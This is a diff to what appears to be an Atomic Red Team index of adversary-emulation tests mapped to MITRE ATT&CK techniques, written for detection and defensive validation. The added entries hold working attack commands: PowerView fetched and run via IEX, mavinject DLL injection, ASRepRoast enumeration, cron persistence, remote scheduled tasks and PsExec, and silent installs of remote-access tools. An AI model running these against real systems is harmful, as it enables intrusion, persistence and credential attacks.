+          copy #{service_executable} "C:\program.exe"
+          sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+          sc start "Example Service"
+        cleanup_command: |
+          sc stop "Example Service"
+          sc delete "Example Service"
+          del "C:\Program Files\windows_service.exe"
+          del "C:\program.exe"
+          del "C:\Time.log"
+        name: command_prompt
+        elevation_required: true
   T1545.001:
     technique:
       external_references:
@@ -28432,13 +28694,14 @@ defense-evasion:
         Windows 10 Utility To Inject DLLS.
 
         Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
       supported_platforms:
       - windows
       input_arguments:
         process_id:
           description: PID of input_arguments
           type: Integer
-          default: "(get-process spoolsv).id"
+          default: "(Start-Process notepad -PassThru).id"
         dll_payload:
           description: DLL to Inject
           type: Path
@@ -30095,19 +30358,19 @@ defense-evasion:
         powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
         copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
 
-        Upon execution, open the weak permission file at %temp%\ T1574.010_weak_permission_file.txt and verify that it's contents read " T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\ T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         malicious_file:
           description: File to replace weak permission file with
           type: path
-          default: "$env:TEMP\\ T1574.010\\ T1574.010_malicious_file.txt"
+          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: "$env:TEMP\\ T1574.010_weak_permission_file.txt"
+          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: A file must exist on disk at specified location (#{weak_permission_file})
@@ -30120,7 +30383,7 @@ defense-evasion:
           this would be the malicious file gaining extra privileges
         prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
-          New-Item -Type Directory -Path $env:TEMP\ T1574.010\ -Force | Out-Null
+          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
       executor:
@@ -35431,6 +35694,32 @@ discovery:
         command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
           Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose'
         name: powershell
+    - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
+      auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
+      description: 'When successful, accounts that do not require kerberos pre-auth
+        will be returned
+
+'
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Computer must be domain joined.
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually.
+      - description: Requires the Active Directory module for powershell to be installed.
+        prereq_command: if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
+          0} else {exit 1}
+        get_prereq_command: Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth
+          -eq $TRUE}
+
+'
   T1482:
     technique:
       id: attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0
@@ -35524,6 +35813,10 @@ discovery:
         This technique has been used by the Trickbot malware family.
       supported_platforms:
       - windows
+      dependencies:
+      - description: nltest.exe from RSAT must be present on disk
+        prereq_command: WHERE nltest.exe >NUL 2>&1
+        get_prereq_command: echo Sorry RSAT must be installed manually
       executor:
         command: 'nltest /domain_trusts
 
@@ -35531,13 +35824,26 @@ discovery:
         name: command_prompt
     - name: Powershell enumerate domains and forests
       auto_generated_guid: c58fbc62-8a62-489e-8f2d-3565d7d96f30
-      description: 'Use powershell to enumerate AD information
-
-'
+      description: |
+        Use powershell to enumerate AD information.
+        Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: PowerView PowerShell script must exist on disk
+        prereq_command: if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit
+          1}
+        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
+          -OutFile "$env:TEMP\PowerView.ps1"
+      - description: RSAT PowerShell AD admin cmdlets must be installed
+        prereq_command: if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And
+          (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else {
+          exit 1 }
+        get_prereq_command: Write-Host "Sorry RSAT must be installed manually"
       executor:
         command: |
+          Import-Module "$env:TEMP\PowerView.ps1"
           Get-NetDomainTrust
           Get-NetForestTrust
           Get-ADDomain
@@ -36363,6 +36669,13 @@ discovery:
           description: Specify interface to perform PCAP on.
           type: String
           default: ens33
+      dependency_executor_name: bash
+      dependencies:
+      - description: Check if at least one of the tools are installed on the machine.
+        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
+          tshark)" ]; then exit 1; else exit 0; fi;
+        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+          exit 1;
       executor:
         command: |
           tcpdump -c 5 -nnni #{interface}
@@ -36413,26 +36726,6 @@ discovery:
           "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
           c:\windump.exe
         name: command_prompt
-        elevation_required: true
-    - name: Packet Capture PowerShell
-      auto_generated_guid: 2bf62970-013a-4c74-b0a8-64030874e89a
-      description: |
-        Perform a packet capture using PowerShell with windump or tshark. This will require a host that has Wireshark/Tshark
-        installed, along with WinPCAP. Windump will require the windump executable.
-
-        Upon successful execution, tshark will spawn from powershell and capture 5 packets on interface Ethernet0.
-      supported_platforms:
-      - windows
-      input_arguments:
-        interface:
-          description: Specify interface to perform PCAP on.
-          type: String
-          default: Ethernet0
-      executor:
-        command: |
-          & "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
-          & c:\windump.exe
-        name: powershell
         elevation_required: true
   T1201:
     technique:
@@ -37744,7 +38037,7 @@ discovery:
           wmic useraccount get /ALL
           quser /SERVER:"#{computer_name}"
           quser
-          qwinsta.exe" /server:#{computer_name}
+          qwinsta.exe /server:#{computer_name}
           qwinsta.exe
           for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
           @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@@ -37992,8 +38285,7 @@ execution:
         unless 'Little Snitch' is installed, in which case it will just exit. \nYou
         can use netcat to listen for the connection and verify execution, e.g. use
         \"nc -l 80\" in another terminal window before executing this test and watch
-        for the request.\n\nNote: If you want to run this command manually on the
-        command line use 'sh -c \"<command>\"'\nReference: https://github.com/EmpireProject/Empire\n"
+        for the request.\n\nReference: https://github.com/EmpireProject/Empire\n"
       supported_platforms:
       - macos
       executor:
@@ -38556,6 +38848,7 @@ execution:
           type: string
           default: persistevil
       executor:
+        elevation_required: true
         name: bash
         command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
   T1559.002:
@@ -39657,6 +39950,7 @@ execution:
           -contains "NTFS") {exit 0} else {exit 1}
         get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
       executor:
+        name: powershell
         command: |
           Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
           $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
@@ -39664,7 +39958,33 @@ execution:
         cleanup_command: 'Remove-Item #{ads_file} -Force -ErrorAction Ignore
 
 '
+    - name: PowerShell Session Creation and Use
+      auto_generated_guid: 7c1acec2-78fa-4305-a3e0-db2a54cddecd
+      description: |
+        Connect to a remote powershell session and interact with the host.
+        Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        hostname_to_connect:
+          description: The host to connect to, by default it will connect to the local
+            machine
+          type: String
+          default: "$env:COMPUTERNAME"
+      dependencies:
+      - description: PSRemoting must be enabled
+        prereq_command: "Try {\n    New-PSSession -ComputerName #{hostname_to_connect}
+          -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}"
+        get_prereq_command: Enable-PSRemoting
+      executor:
         name: powershell
+        elevation_required: true
+        command: |
+          New-PSSession -ComputerName #{hostname_to_connect}
+          Test-Connection $env:COMPUTERNAME
+          Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
+          Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+          Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
   T1059.006:
     technique:
       external_references:
@@ -39845,21 +40165,21 @@ execution:
           type: String
           default: localhost
         user_name:
-          description: Username DOMAIN\User
+          description: 'Username to authenticate with, format: DOMAIN\User'
           type: String
           default: DOMAIN\user
         password:
-          description: Password
+          description: Password to authenticate with
           type: String
           default: At0micStrong
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
+        command: 'SCHTASKS /Create /S #{target} /U #{user_name} /P #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -40125,7 +40445,7 @@ execution:
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+          New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
         command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
@@ -44488,7 +44808,7 @@ command-and-control:
     - name: Testing usage of uncommonly used port with PowerShell
       auto_generated_guid: 21fe622f-8e53-4b31-ba83-6d333c2583f4
       description: |
-        Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon exectuion, details about the successful
+        Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful
         port check will be displayed.
       supported_platforms:
       - windows
@@ -44861,7 +45181,13 @@ command-and-control:
       executor:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
-          C:\Users\$env:username\Desktop\TeamViewer_Setup.exe
+          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
+          Start-Process $file1 /S;
+          Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
+        cleanup_command: |-
+          Start-Process 'C:\Program Files (x86)\TeamViewer\uninstall.exe' "/S"
+          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
+          Remove-Item $file1
         name: powershell
         elevation_required: true
     - name: AnyDesk Files Detected Test on Windows
@@ -44876,7 +45202,11 @@ command-and-control:
       executor:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
-          C:\Users\$env:username\Desktop\AnyDesk.exe
+          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
+          Start-Process $file1 /S;
+        cleanup_command: |-
+          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe.exe"
+          Remove-Item $file1
         name: powershell
         elevation_required: true
     - name: LogMeIn Files Detected Test on Windows
@@ -44891,7 +45221,13 @@ command-and-control:
       executor:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
-          C:\Users\$env:username\Desktop\LogMeInIgnition.msi
+          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+          Start-Process $file1 /S;
+          Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
+        cleanup_command: |-
+          get-package *'LogMeIn Client'* | uninstall-package
+          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+          Remove-Item $file1
         name: powershell
         elevation_required: true
   T1132.001:
@@ -45962,7 +46298,7 @@ collection:
 
 '
         name: command_prompt
-    - name: PowerShell
+    - name: Execute Commands from Clipboard using PowerShell
       auto_generated_guid: d6dc21af-bec9-4152-be86-326b6babd416
       description: 'Utilize PowerShell to echo a command to clipboard and execute
         it
